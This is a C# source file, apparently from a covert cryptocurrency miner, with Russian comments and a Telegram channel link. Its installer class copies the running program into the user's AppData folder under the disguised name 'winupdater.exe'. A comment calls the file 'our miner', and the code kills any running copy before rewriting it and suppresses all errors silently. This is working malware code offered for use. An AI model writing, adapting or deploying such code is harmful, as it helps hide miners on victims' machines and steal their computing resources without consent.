using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

// https://t.me/VolVeRFM

namespace VolVeRFMI
{
    public class Installer
    {
        public FileInfo FileName = new FileInfo("winupdater.exe"); // Задаем имя нашего майнера
        public DirectoryInfo DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Windows")); // Задаем путь в appdata

        public void IsInstalled()
        {
            Path.Combine(DirectoryName.FullName, FileName.Name); // Полный путь, с именем в папке 
        }


        public void CreateDirectory()
        {
            if (DirectoryName.Exists) // Делаем проверку 
                return;
            DirectoryName.Create(); // Создаем 
        }

        public void InstallFile()
        {
            string path = Path.Combine(DirectoryName.FullName, FileName.Name);
            if (FileName.Exists) // Опять проверяем 
            {
                foreach (Process process in Process.GetProcesses())
                {
                    try
                    {
                        if (process.MainModule.FileName == path)
                            process.Kill(); // Если есть процес, то убиваем
                    }
                    catch
                    {
                    }
                }
                File.Delete(path);// Если есть папка, удаляем
                Thread.Sleep(280); // Задержка
            }
            using (FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.Write))
            {
                byte[] buffer = File.ReadAllBytes(Application.ExecutablePath); // Считываем содержимое файла в виде масива байтов
                fileStream.Write(buffer, 0, buffer.Length); // И публикуем, все то что в содержимом файле
            }
        }


        public void Run()
        {
            try
            {
                IsInstalled();
                CreateDirectory();
                InstallFile();
            }
            catch
            {
            }
        }

    }
}
